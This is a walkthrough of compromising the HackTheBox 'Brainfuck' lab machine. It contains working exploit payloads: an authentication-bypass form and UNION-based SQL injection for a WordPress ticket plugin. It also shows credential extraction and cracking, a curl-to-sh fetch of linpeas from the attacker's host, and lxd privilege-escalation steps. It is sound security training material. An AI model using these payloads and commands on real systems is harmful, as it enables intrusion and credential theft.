# Brainfuck

## Introduction

Welcome to my another writeup! In this HackTheBox [Brainfuck](https://app.hackthebox.com/machines/Brainfuck) machine, you'll learn: Exploiting WordPress plugin, enumerating emails, privilege escalation via lxd/lxc group, and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★★★☆☆☆☆

## Table of Content

1. **[Service Enumeration](#service-enumeration)**
2. **[Initial Foothold](#initial-foothold)**
3. **[Privilege Escalation: orestis to root (Unintended)](#privilege-escalation)**
4. **[Conclusion](#conclusion)**

## Background

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Brainfuck/images/Brainfuck.png)

## Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Brainfuck)-[2023.06.04|16:03:40(HKT)]
└> export RHOSTS=10.10.10.17           
┌[siunam♥earth]-(~/ctf/htb/Machines/Brainfuck)-[2023.06.04|16:03:43(HKT)]
└> rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt 
[...]
PORT    STATE SERVICE  REASON  VERSION
22/tcp  open  ssh      syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94d0b334e9a537c5acb980df2a54a5f0 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDUvFkWE1DxJj4OsU4DiVLjkxYV2a9pSlMS/78hpx0IejJaFilgNb+RFCyfyhIw5NvsZB6hZiNL0vPDh+MscPd75heIIgx9mczfamsrA2KODdkdgUJPCBWUnF9/VhYQhJpGvo4f6lAwLz7wnmcjhiXencMNkZcweADi5aK0Xp6iFxYcwx6+qy0891gQ5TnVVazkDJNA+QMUamxJRm1tQN5dp/+TeBecWJH2AxQFXsM4wPkIFaE0GsKvYDmGyfy1YL/Gn5IxEqVrhIEYkDH4BQsbvORNueOtJKHoys7EhPF+STpx6ZAXS6AXhS/nJMz6EvubzeGqfBOaDIZN9u5JuCdf
|   256 6bd5dc153a667af419915d7385b24cb2 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCJcOJZuuBlw9xDXy+VPpezMomPfySGOjABaxw02cmRifvzWE57mh1hlQD6z44IF1lsuW9E2NNH4xB4d8U0O5b0=
|   256 23f5a333339d76d5f2ea6971e34e8e02 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOokdEAUqLEqEuY1CHNJ2xaDU+L+/0qb3XZO8UIZfrju
25/tcp  open  smtp     syn-ack Postfix smtpd
|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
110/tcp open  pop3     syn-ack Dovecot pop3d
|_pop3-capabilities: TOP UIDL CAPA SASL(PLAIN) USER PIPELINING RESP-CODES AUTH-RESP-CODE
143/tcp open  imap     syn-ack Dovecot imapd
|_imap-capabilities: AUTH=PLAINA0001 SASL-IR more have listed LITERAL+ capabilities Pre-login ENABLE ID LOGIN-REFERRALS IMAP4rev1 post-login OK IDLE
443/tcp open  ssl/http syn-ack nginx 1.10.0 (Ubuntu)
| tls-nextprotoneg: 
|_  http/1.1
| http-methods: 
|_  Supported Methods: GET HEAD
| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR/organizationalUnitName=IT/emailAddress=orestis@brainfuck.htb/localityName=Athens
| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
| Issuer: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR/organizationalUnitName=IT/emailAddress=orestis@brainfuck.htb/localityName=Athens
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2017-04-13T11:19:29
| Not valid after:  2027-04-11T11:19:29
| MD5:   cbf1689996aaf7a005650fc094917f20
| SHA-1: f448e798a8175580879c8fb8ef0e2d3dc656cb66
| -----BEGIN CERTIFICATE-----
| MIIFQzCCA6ugAwIBAgIJAI24F5h8eY+HMA0GCSqGSIb3DQEBCwUAMIGTMQswCQYD
[...]
| krhc81zFeg==
|_-----END CERTIFICATE-----
|_http-title: Welcome to nginx!
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.10.0 (Ubuntu)
Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

According to `rustscan` result, we have 5 ports are opened:

|Open Port         | Service                       |
|:---:             |:---:                          |
|22                | OpenSSH 7.2p2 Ubuntu          |
|25                | Postfix smtpd (Simple Mail Transfer Protocol)|
|110               | Dovecot pop3d (Post Office Protocol)|
|143               | Dovecot imapd (Internet Message Access Protocol)|
|443               | nginx 1.10.0 (Ubuntu)         |

### SMTP on port 25

**Enumerate it via `nmap`'s scripts:**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Brainfuck)-[2023.06.04|16:07:12(HKT)]
└> nmap -p25 --script smtp* $RHOSTS -v
[...]
PORT   STATE SERVICE
25/tcp open  smtp
|_smtp-open-relay: Server doesn't seem to be an open relay, all tests failed
| smtp-enum-users: 
|_  Method RCPT returned a unhandled status code.
|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
| smtp-vuln-cve2010-4344: 
|_  The SMTP server is not Exim: NOT VULNERABLE
```

Seems nothing?

**We could also try to enumerate local user via `VRFY` command:**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Brainfuck)-[2023.06.04|16:11:06(HKT)]
└> nc -nv $RHOSTS 25
(UNKNOWN) [10.10.10.17] 25 (smtp) open
VRFY root
220 brainfuck ESMTP Postfix (Ubuntu)
252 2.0.0 root
VRFY www-data
252 2.0.0 www-data
VRFY anything
550 5.1.1 <anything>: Recipient address rejected: User unknown in local recipient table
```

### POP3 on port 110

**Obtain the capabilities of the POP3 server via `CAPA`:**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Brainfuck)-[2023.06.04|16:17:31(HKT)]
└> nc -nv $RHOSTS 110                                               
(UNKNOWN) [10.10.10.17] 110 (pop3) open
+OK Dovecot ready.
CAPA
+OK
CAPA
TOP
UIDL
RESP-CODES
PIPELINING
AUTH-RESP-CODE
USER
SASL PLAIN
.
```

Nothing weird.

### IMAP on port 143

```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Brainfuck)-[2023.06.04|16:22:58(HKT)]
└> nc -nv $RHOSTS 143
(UNKNOWN) [10.10.10.17] 143 (imap2) open
* OK [CAPABILITY IMAP4rev1 LITERAL+ SASL-IR LOGIN-REFERRALS ID ENABLE IDLE AUTH=PLAIN] Dovecot ready.
A1 LOGIN admin admin
A1 NO [AUTHENTICATIONFAILED] Authentication failed.
```

We could brute force some credentials.

### HTTPS on port 443

**Adding a new host to `/etc/hosts`:**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Brainfuck)-[2023.06.04|16:24:02(HKT)]
└> echo "$RHOSTS brainfuck.htb" | sudo tee -a /etc/hosts
```

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Brainfuck/images/Pasted%20image%2020230604162518.png)

The SSL certificate is self-signed.

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Brainfuck/images/Pasted%20image%2020230604162641.png)

In here, we can see that the web application is a blog, and it's using a Content Management System (CMS) called "**WordPress**".

We can also see that there are 2 users:

- WordPress user: `admin`
- SMTP user: `orestis`

**We can verify that in SMTP:**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Brainfuck)-[2023.06.04|16:24:44(HKT)]
└> nc -nv $RHOSTS 25 
(UNKNOWN) [10.10.10.17] 25 (smtp) open
VRFY orestis
220 brainfuck ESMTP Postfix (Ubuntu)
252 2.0.0 orestis
```

**In WordPress, we can use a tool called `wpscan` to scan vulnerabilities in WordPress:**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Brainfuck)-[2023.06.04|16:29:06(HKT)]
└> wpscan --url https://brainfuck.htb/ --disable-tls-checks
[...]
[+] WordPress version 4.7.3 identified (Insecure, released on 2017-03-06).
 | Found By: Rss Generator (Passive Detection)
 |  - https://brainfuck.htb/?feed=rss2, <generator>https://wordpress.org/?v=4.7.3</generator>
 |  - https://brainfuck.htb/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.7.3</generator>
[...]
[i] Plugin(s) Identified:

[+] wp-support-plus-responsive-ticket-system
 | Location: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/
 | Last Updated: 2019-09-03T07:57:00.000Z
 | [!] The version is out of date, the latest version is 9.1.2
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 7.1.3 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt
[...]
```

I used `searchsploit` to find public exploits about WordPress version 4.7.3, but no dice.

**However, the plugin "Support Plus Responsive Ticket System" is interesting:**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Brainfuck)-[2023.06.04|16:35:11(HKT)]
└> searchsploit wordpress support-plus-responsive-ticket-system
-------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                    |  Path
-------------------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escalation            | php/webapps/41006.txt
WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - SQL Injection                   | php/webapps/40939.txt
-------------------------------------------------------------------------------------------------- ---------------------------------
```

Looks like version 7.1.3 is vulnerable to Privilege Escalation and SQL Injection?

**Let's mirror them:**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Brainfuck)-[2023.06.04|16:35:22(HKT)]
└> searchsploit -m 41006                                       
  Exploit: WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escalation
      URL: https://www.exploit-db.com/exploits/41006
     Path: /usr/share/exploitdb/exploits/php/webapps/41006.txt
    Codes: N/A
 Verified: True
File Type: ASCII text
Copied to: /home/siunam/ctf/htb/Machines/Brainfuck/41006.txt


┌[siunam♥earth]-(~/ctf/htb/Machines/Brainfuck)-[2023.06.04|16:35:37(HKT)]
└> searchsploit -m 40939
  Exploit: WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - SQL Injection
      URL: https://www.exploit-db.com/exploits/40939
     Path: /usr/share/exploitdb/exploits/php/webapps/40939.txt
    Codes: N/A
 Verified: True
File Type: Unicode text, UTF-8 text
Copied to: /home/siunam/ctf/htb/Machines/Brainfuck/40939.txt
```

**In `41006.txt`, we can login as any user with the following POST request:**
```
# Exploit Title: WP Support Plus Responsive Ticket System 7.1.3 Privilege Escalation
[...]
1. Description

You can login as anyone without knowing password because of incorrect usage of wp_set_auth_cookie().

http://security.szurek.pl/wp-support-plus-responsive-ticket-system-713-privilege-escalation.html

2. Proof of Concept

<form method="post" action="http://wp/wp-admin/admin-ajax.php">
	Username: <input type="text" name="username" value="administrator">
	<input type="hidden" name="email" value="sth">
	<input type="hidden" name="action" value="loginGuestFacebook">
	<input type="submit" value="Login">
</form>

Then you can go to admin panel.
```

The `<form>` element will send a POST request to `/wp-admin/admin-ajax.php` with POST parameter `username`, `email`, `action`, `submit`.

**`41006_poc.html`:**
```html
<form method="post" action="https://brainfuck.htb/wp-admin/admin-ajax.php">
	Username: <input type="text" name="username" value="admin">
	<input type="hidden" name="email" value="sth">
	<input type="hidden" name="action" value="loginGuestFacebook">
	<input type="submit" value="Login">
</form>
```

**Let's try that!**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Brainfuck)-[2023.06.04|16:39:34(HKT)]
└> firefox 41006_poc.html
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Brainfuck/images/Pasted%20image%2020230604164602.png)

> Note: We found the `admin` user in the home page.

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Brainfuck/images/Pasted%20image%2020230604164647.png)

It responses us with a `0`, and set some cookies!

**Which means we're authenticated as user `admin`!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Brainfuck/images/Pasted%20image%2020230604164802.png)

Nice!!

Let's enumerate and even get a reverse shell!

The "Open Ticket" and "Sample Page" is just an empty page and a sample page.

In the admin panel, we can try to upload a reverse shell.

For example, modifying a theme's PHP code:

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Brainfuck/images/Pasted%20image%2020230604165439.png)

Uhh... Nope, we can't modify anything in the theme editor.

How about upload a reverse shell via "Plugins" page?

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Brainfuck/images/Pasted%20image%2020230604170158.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Brainfuck/images/Pasted%20image%2020230604170252.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Brainfuck/images/Pasted%20image%2020230604165944.png)

Nope. Looks like someone disabled plugins upload.

Since this web application is using HTTPS, we can view it's SSL certificate.

**Luckly, our `nmap`'s scan already did the job for us:**
```shell
443/tcp open  ssl/http syn-ack nginx 1.10.0 (Ubuntu)
[...]
commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR/organizationalUnitName=IT/emailAddress=orestis@brainfuck.htb/localityName=Athens
| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
| Issuer: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR/organizationalUnitName=IT/emailAddress=orestis@brainfuck.htb/localityName=Athens
[...]
```

**Oh! We found 2 subdomains in Subject Alternative Name (SAN):**
- DNS: www.brainfuck.htb
- DNS: sup3rs3cr3t.brainfuck.htb

**Let's add them in `/etc/hosts`!**
```shell
10.10.10.17 brainfuck.htb www.brainfuck.htb sup3rs3cr3t.brainfuck.htb
```

**`www.brainfuck.htb`:**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Brainfuck)-[2023.06.04|17:09:57(HKT)]
└> curl -k https://www.brainfuck.htb/ -v
[...]
> GET / HTTP/1.1
> Host: www.brainfuck.htb
> User-Agent: curl/7.88.1
> Accept: */*
> 
< HTTP/1.1 301 Moved Permanently
< Server: nginx/1.10.0 (Ubuntu)
< Date: Sun, 04 Jun 2023 09:09:59 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< Location: https://brainfuck.htb/
< 
* Connection #0 to host www.brainfuck.htb left intact
```

The `www` subdomain is just redirecting us to `https://brainfuck.htb/`, which is the WordPress CMS.

**How about `sup3rs3cr3t` subdomain?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Brainfuck/images/Pasted%20image%2020230604171107.png)

Oh! Interesting.

In here, we can see that it's a secret forum.

**In FireFox extension "Wappalyzer", viewing source page, and session cookie, we can see that it's using an internet forum software called "[Flarum](https://flarum.org/)":**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Brainfuck/images/Pasted%20image%2020230604171325.png)

```html
          <script>
        document.getElementById('flarum-loading').style.display = 'block';
      </script>
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Brainfuck/images/Pasted%20image%2020230604171543.png)

Let's enumerate again!

**In the "Development" post, we found 2 same users again:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Brainfuck/images/Pasted%20image%2020230604171658.png)

As expected, the user `admin` is an admin privilege user.

I also tried to find public exploits in Flarum, but nothing.

Then, I enumerated hidden directories and files, brute forced both users' password, no dice at all.

Let's take a step back.

**We still have 1 more thing in the WordPress CMS: SQL injection in Support Plus Responsive Ticket System 7.1.3!**

**`40939.txt`:**
```
# Exploit Title: WP Support Plus Responsive Ticket System 7.1.3 – WordPress Plugin – Sql Injection
[...]
1 - Description:

Type user access: any user. $_POST[‘cat_id’] is not escaped. Is accessible for any user.

http://lenonleite.com.br/en/blog/2016/12/13/wp-support-plus-responsive-ticket-system-wordpress-plugin-sql-injection/

2 - Proof of Concept:

<form action="http://target/wp-admin/admin-ajax.php" method="post">
<input type="text" name="action" value="wpsp_getCatName">
<input type="text" name="cat_id" value="0 UNION SELECT 1,CONCAT(name,CHAR(58),slug),3 FROM wp_terms WHERE term_id=1">
<input type="submit" name="">
</form>
[...]
```

The `<form>` element will send a POST request to `/wp-admin/admin-ajax.php`, with parameter `action` and `cat_id`. The `cat_id` is vulnerable to Union-based SQL injection.

**`40939_poc.html`:**
```html
<form action="https://brainfuck.htb/wp-admin/admin-ajax.php" method="post">
<input type="text" name="action" value="wpsp_getCatName">
<input type="text" name="cat_id" value="0 UNION SELECT 1,CONCAT(name,CHAR(58),slug),3 FROM wp_terms WHERE term_id=1">
<input type="submit" name="">
</form>
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Brainfuck/images/Pasted%20image%2020230604175407.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Brainfuck/images/Pasted%20image%2020230604175439.png)

The Proof-of-Concept's payload works!!

Let's modify the payload and extract it's database data!

**Enumerate database:**
```sql
0 UNION SELECT NULL,GROUP_CONCAT(schema_name),NULL FROM information_schema.schemata
```

- Database: `information_schema`,`webfolio`

We can assume that database `webfolio` is the WordPress's MySQL database.

**Extract username and password hash from table `wp_users`:**
```sql
0 UNION SELECT NULL,CONCAT(user_login,CHAR(58),user_pass),NULL FROM wp_users
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Brainfuck/images/Pasted%20image%2020230604180613.png)

Found `admin`'s password hash! Let's crack it!

```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Brainfuck)-[2023.06.04|18:05:57(HKT)]
└> john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
[...]
0g 0:00:05:21 86.84% (ETA: 18:12:06) 0g/s 38969p/s 38969c/s 38969C/s 3666664..36637977
```

Nope...

**Then, I found tables `wf_*` via the following payload:**
```sql
0 UNION SELECT NULL,CONCAT(table_schema,CHAR(58),table_name),NULL FROM information_schema.tables LIMIT 1 OFFSET 61
```

Those tables are for another `webfolio` WordPress CMS.

However, I tried to extract usernames and password hashes, there's no user at all.

## Initial Foothold

Ok... Take a step back again...

Is there anything else we missed?? Like WordPress plugins.

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Brainfuck/images/Pasted%20image%2020230604200647.png)

Ah ha! We do miss something!

The plugin "Easy WP SMTP" is to send email via SMTP.

**Let's click on "Settings" to find interesting stuff:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Brainfuck/images/Pasted%20image%2020230604200826.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Brainfuck/images/Pasted%20image%2020230604200842.png)

**Oh nice!!! We found a credentials for user `oresits`!**

Since SMTP, POP3, IMAP, SSH service is there on the target machine, let's try to retrieve some emails from that user:

**IMAP:**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Brainfuck)-[2023.06.04|20:23:22(HKT)]
└> nc -nv $RHOSTS 143
(UNKNOWN) [10.10.10.17] 143 (imap2) open
* OK [CAPABILITY IMAP4rev1 LITERAL+ SASL-IR LOGIN-REFERRALS ID ENABLE IDLE AUTH=PLAIN] Dovecot ready.
A1 LOGIN "orestis" "{Redacted}"
A1 OK [CAPABILITY IMAP4rev1 LITERAL+ SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SPECIAL-USE] Logged in
```

Nice! We're logged in on IMAP!

**We can now retrieve emails via:** (Commands are from [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-imap#syntax))
```shell
A1 FETCH 2 body[text]
* 2 FETCH (BODY[TEXT] {123}
Hi there, your credentials for our "secret" forum are below :)

username: orestis
password: {Redacted}

Regards
)
A1 OK Fetch completed (0.001 + 0.000 secs).
```

Nice! We found user `orestis`' password in the secret forum!!

Let's login!

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Brainfuck/images/Pasted%20image%2020230604202704.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Brainfuck/images/Pasted%20image%2020230604202712.png)

Again, enumerate.

**In the home page, we can see 2 more posts:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Brainfuck/images/Pasted%20image%2020230604202828.png)

**SSH Access:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Brainfuck/images/Pasted%20image%2020230604202851.png)

Oh... Looks like the SSH service disabled password login, and it only accepts SSH private key to login to SSH.

Also, user `orestis` is opening a thread for admin to send `orestis` SSH private key.

**Key:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Brainfuck/images/Pasted%20image%2020230604203047.png)

As you can see, their messages are being encrypted.

By looking at the `mnvze://zsrivszwm.rfz/8cr5ai10r915218697i1w658enqc0cs8/ozrxnkc/ub_sja`, it's pretty clear that the `mnvze` is `https`, `zsrivszwm.rfz` is `brainfuck.htb`.

After some guessing, I found the encryption algorithm is Vigenere Cipher.

**In the "SSH Access" and "Key" post, user `oresits`'s comments has a quote:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Brainfuck/images/Pasted%20image%2020230604205148.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Brainfuck/images/Pasted%20image%2020230604205154.png)

**In [CyberChef](https://gchq.github.io/CyberChef/), we can use a recipe called "Vigenere Decode".**

**We can try to copy and paste the ciphered text to "Input", and the original quote to "Key":**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Brainfuck/images/Pasted%20image%2020230604205400.png)

Oh! Looks like we found the key? `BrainfuCkmybrainfuckmybrainfu`

After fumbling around, we can find the correct key:

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Brainfuck/images/Pasted%20image%2020230604205630.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Brainfuck/images/Pasted%20image%2020230604205644.png)

Nice!

**Let's decipher all of them:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Brainfuck/images/Pasted%20image%2020230604205815.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Brainfuck/images/Pasted%20image%2020230604205826.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Brainfuck/images/Pasted%20image%2020230604205840.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Brainfuck/images/Pasted%20image%2020230604205855.png)

We found `orestis` private SSH key!

**Let's download it!**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Brainfuck)-[2023.06.04|20:59:41(HKT)]
└> curl https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa -k -o orestis_id_rsa
[...]
┌[siunam♥earth]-(~/ctf/htb/Machines/Brainfuck)-[2023.06.04|20:59:59(HKT)]
└> chmod 600 orestis_id_rsa 
```

**However, the private key has passphrase:** (`ENCRYPTED`)
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Brainfuck)-[2023.06.04|21:00:19(HKT)]
└> head -n 3 orestis_id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6904FEF19397786F75BE2D7762AE7382
```

**We can use `ssh2john` and `john` to crack it:**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Brainfuck)-[2023.06.04|21:01:03(HKT)]
└> ssh2john orestis_id_rsa > orestis_id_rsa_hash.txt
┌[siunam♥earth]-(~/ctf/htb/Machines/Brainfuck)-[2023.06.04|21:01:11(HKT)]
└> john --wordlist=/usr/share/wordlists/rockyou.txt orestis_id_rsa_hash.txt 
[...]
{Redacted}       (orestis_id_rsa)     
[...]
```

**We can now finally SSH into user `orestis` with the private SSH key!**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Brainfuck)-[2023.06.04|21:01:27(HKT)]
└> ssh -i orestis_id_rsa orestis@$RHOSTS            
Enter passphrase for key 'orestis_id_rsa': 
[...]
orestis@brainfuck:~$ whoami;hostname;id;ip a
orestis
brainfuck
uid=1000(orestis) gid=1000(orestis) groups=1000(orestis),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),121(lpadmin),122(sambashare)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:91:d4 brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.17/24 brd 10.10.10.255 scope global ens160
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:91d4/64 scope global mngtmpaddr dynamic 
       valid_lft 86396sec preferred_lft 14396sec
    inet6 fe80::250:56ff:feb9:91d4/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm user `orestis`!

**user.txt:**
```shell
orestis@brainfuck:~$ cat /home/orestis/user.txt 
{Redacted}
```

## Privilege Escalation

### orestis to root

After gaining initial foothold, we can escalate our privilege to root.

Let's enumerate!

**SUID binaries:**
```shell
orestis@brainfuck:~$ find / -perm -4000 2>/dev/null
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/bin/procmail
/usr/bin/at
/usr/bin/pkexec
/usr/bin/newgidmap
/usr/bin/newuidmap
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/gpasswd
/bin/umount
/bin/su
/bin/ping
/bin/ping6
/bin/ntfs-3g
/bin/mount
/bin/fusermount
```

**Found MySQL credentials:**
```shell
orestis@brainfuck:~$ cat /var/www/cms/wp-config.php 
[...]
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'webfolio');

/** MySQL database username */
define('DB_USER', 'orestis');

/** MySQL database password */
define('DB_PASSWORD', '{Redacted}');

/** MySQL hostname */
define('DB_HOST', 'localhost');
[...]
```

It's the same as the SMTP one.

**In the `id`'s output, we're inside the `lxd` group:**
```shell
orestis@brainfuck:~$ id
uid=1000(orestis) gid=1000(orestis) groups=1000(orestis),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),121(lpadmin),122(sambashare)
```

Maybe we could escalate our privilege via that.

**LinPEAS:**
```shell
┌[siunam♥earth]-(/usr/share/peass/linpeas)-[2023.06.04|21:12:01(HKT)]
└> python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```shell
orestis@brainfuck:~$ curl -s http://10.10.14.26/linpeas.sh | sh
[...]
╔══════════╣ Searching tmux sessions
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions
tmux 2.1


/tmp/tmux-1000
[...]
```

**Found tmux session.** Maybe we could do tmux sessions hijacking.

However, it's not exploitable in version 2.1.

**Now, let's try lxd/lxc group privilege escalation:** (All steps are from [https://www.hackingarticles.in/lxd-privilege-escalation/](https://www.hackingarticles.in/lxd-privilege-escalation/))

- Download build-alpine in your local machine through the [git repository](https://github.com/saghul/lxd-alpine-builder):

```shell
┌[siunam♥earth]-(/opt)-[2023.06.04|21:28:46(HKT)]
└> git clone https://github.com/saghul/lxd-alpine-builder.git
```

- Execute the script "`build-alpine`" that will build the latest Alpine image as a compressed file:

```shell
┌[siunam♥earth]-(/opt/lxd-alpine-builder)-[2023.06.04|21:29:34(HKT)]-[git://master ✗]
└> ./build-alpine 
build-alpine: must be run as root
┌[siunam♥earth]-(/opt/lxd-alpine-builder)-[2023.06.04|21:29:36(HKT)]-[git://master ✗]
└> sudo ./build-alpine                  
[...]
┌[siunam♥earth]-(/opt/lxd-alpine-builder)-[2023.06.04|21:30:11(HKT)]-[git://master ✗]
└> ls -lah                    
[...]
-rw-r--r--   1 root   root 2.5M Jun  4 21:30 alpine-v3.8-x86_64-20230604_2130.tar.gz
[...]
```

- Transfer the tar file to the target machine:

```shell
┌[siunam♥earth]-(/opt/lxd-alpine-builder)-[2023.06.04|21:21:47(HKT)]-[git://master ✗]
└> python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```shell
orestis@brainfuck:~$ wget http://10.10.14.26/alpine-v3.8-x86_64-20230604_2130.tar.gz -O /tmp/alpine-v3.8-x86_64-20230604_2130.tar.gz
```

- Import image for lxd:

```shell
orestis@brainfuck:~$ lxc image import /tmp/alpine-v3.8-x86_64-20230604_2130.tar.gz --alias myimage
